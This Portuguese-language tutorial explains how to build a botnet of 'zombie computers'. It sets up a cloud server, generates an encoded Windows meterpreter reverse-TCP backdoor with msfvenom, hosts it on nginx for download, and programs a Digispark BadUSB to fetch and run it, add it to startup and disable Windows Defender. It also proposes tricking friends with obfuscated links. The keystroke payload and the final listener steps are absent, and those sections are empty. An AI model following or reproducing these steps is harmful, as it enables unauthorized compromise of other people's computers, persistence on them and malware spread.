PASSOS 

1 - Criar uma INSTANCIA e definir um IP estatico

    Eu estarei utilizando o GCP(Google cloud platform) mas você pode utilizar o provedor de CLOUD que deseja ou até mesmo um VPS.

    1 - Acesso meu console e crio a instancia. Estancia essa que é bem basica uma micro com SO Debian 9

    2 - Com o a instancia criada, eu defino um IP estatico para minha instancia. Um IP estatico é necessario para que não ocorra o risco do IP mudar e perdemos nossos "computadores zumbis" já conquistados.

2 - Instalar METASPLOIT e NGINX


        Nesse passo vamos instalar nosso canivete suiço METASPLOIT para criamos nosso BACKDOOR e orquestramos nossos "computadores zumbis" o nginx vai ser necessario para que o nosso payload do Digispark possa fazer o download do BACKDOOR para dentro da maquina alvo.

        1 - Conecte a sua instancia por ssh para instalarmos o METASPLOIT e o NGINX para isso rode 

            $ ssh usuario@instancia 

            apos se conectar rode instale o nginx ou apache como preferir

            $ sudo apt-get install -y nginx

            agora os comandos abaixo é para instalar o METASPLOIT

            $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

            conceder permisão de execução para o instalador

            $ chmod +x msfinstall

            agora execulte o mesmo

            $ ./msfinstall

            Efeito isso e não deu nenhum error é so verificar se ta tudo certo.
            Como vai ser a primeira execução ele vai perguntar se você deseja criar um novo banco de dados para o metasploit você responde com um sim e seus dados que ele vai criar as credenciais e configurar tudo para que você possa utilizar a ferramenta

            $ msfconsole --version

3 - Criar BACKDOOR REVERSE


        1 -  Agora vamos criar o backdoor definindo qual tipo de conexão iremos usar que vai ser uma REVERSA TCP para qual tipo de SO,
        qual vai ser o nosso LHOST(IP de comunicação) nossa LPORT(porta de comunicação) o tipo da extenção do backdoor -f exe o algoritmo de criptografia e compreensão, -i o numero de interações do encoded com o backdoor, -o o nosso arquivo de saida. 

        se você estive e uma cloud provavelmente vai ter que criar uma regra de firewall para a sua porta escolhida

        $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=34.97.212.80 LPORT=5000 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe

        Rodando um ls verá que o arquivo payload.exe foi criado


4 - Configurar NGINX para download do backdoor

        1 - Vamos criar uma copia dele dentro da nossa pasta do servidor 

        $ sudo cp ./payload.exe /var/www/html/payload.exe

        3 - feito isso nosso arquivo vai esta disponivel para download em 

        http://34.97.212.80/payload.exe


5 - Digispark
    
        Para continuarmos com nosso ataque, precisamos conquistar nosso primeiro "Zumbir".
        Podemos fazer isso de varias formas envolvendo engenharia social entre elas as mais comuns, como enviar o nosso link para um amigo, ofuscado de tal forma que não levante suspeitas. 
        
        Mas aqui vou abordar um ataque de infecção fisica, onde iremos ter acesso fisico a uma maquina e com a posse de um Digispark iremos infectar uma maquina. 
        Para quem não conhece o Digispark, ele é uma placa de desenvolvimento com tamanho reduzido e 6 pinos de I/O (entrada/saída), ideal para uso em projetos de IoT (Internet of Things ou Internet das Coisas) ou simplesmente para uso em projetos onde você não precisa de muitas portas do microcontrolador. 
        
        Que chega ser um GENERICO ao Rubber duck(dispositivo esse usado na serie Mr. Robot) e pode ser programada com a IDE do Arduino. 
        
        com isso configuraremos o Digispark para reconhecido como um teclado, qual não iremos precisar de nenhum tipo de permisão do usuario da maquina e iremos executar comandos de teclado para fazer o download do backdoor e execultar ele na maquina e adicionar ele junto a inicialização do Windows, para que quando a maquinar for reiniciar obtermos uma nova conexão com a mesma. 
        
        Agora bora lá, para isso você vai precisar de um Digispark ATtiny85 que pode ser encontrado no mercado livre por R$ 16 
        
        https://eletronicos.mercadolivre.com.br/pecas-componentes/arduino-digispark
        
        Com ele em mãos agora você vai precisar carregar neles os modulos de "teclado" transformando-o em um "rubbe duck" para isso você pode seguir os passos deste tutorial e voltar aqui
        
        https://aminbohio.com/creating-a-cheap-rubber-ducky-aka-bad-usb-with-attiny85/
        
        Talvez você enfrente problemas ao efetuar a injeção de payload no digispark para resolver isso você vai precisar configurar o uDev 
        https://www.hardware.com.br/livros/ferramentas-linux/entendendo-udev.html
         

6 - Criar Payload para injectar o BACKDOOR 

          Feito tudo isso e com o ARDUINO IDE instalado vamos criar o nosso Payload que ao pluggarmos em uma maquina vai fazer o download do backdoor, mover ele para a inicialização do windows, tentar desativar o windows defender e  execultar nosso backdoor, tudo isso em questão de segundos hahahahaha
        
        Abra o Arduino IDE e cole o payload que vou deixar aqui para vocês
        
        copiado e colado e entendido o que o payload faz, você pluga o digispark na porta USB da sua maquina e clicamos em verificar primeiro e depois em carregar e aguarde a IDE solicitar que você pluge o dispositivo
        
        E SUCESSO! Diggispark RUBBE DUCK esta criado. Agora basta plugar o digispark em qualquer maquina windows aguardar 4 segundos e remove-lo, tudo muito rapido. 


7 - INICIAR ESCULTA DAS CONEXOES DO BACKDOOR

        Agora voltamos para a nossa instancia para iniciarmos a esculta do backdoor na nossa porta
        
    


8 - Obter acesso a uma maquina infectada
